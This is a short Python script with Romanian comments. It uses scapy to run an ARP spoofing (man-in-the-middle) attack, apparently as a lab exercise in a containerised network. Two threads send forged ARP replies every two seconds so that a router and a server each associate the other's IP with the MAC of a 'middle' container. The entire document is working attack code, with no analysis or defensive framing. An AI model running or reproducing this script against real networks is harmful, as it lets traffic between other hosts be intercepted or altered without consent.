from scapy.all import ARP, send
import time
import threading

# Adresele ip pentru dispozitivele din retea si adresa mac a containerului middle
router_ip = "198.7.0.1"
server_ip = "198.7.0.2"
mac_middle = "02:42:c6:0a:00:02"

# Functia care trimite pachetele ARP falsificate catre victima
def spoof(ip_tinta, ip_fals):
	pachet_arp = ARP(op=2, pdst=ip_tinta, psrc=ip_fals, hwdst=mac_middle)
	while True:
		send(pachet_arp, verbose=False)
		time.sleep(2)

# Creez firele de executie 
t1 = threading.Thread(target=spoof, args=(server_ip, router_ip))
t2 = threading.Thread(target=spoof, args=(router_ip, server_ip))

# Pornesc firele de executie
t1.start()
t2.start()
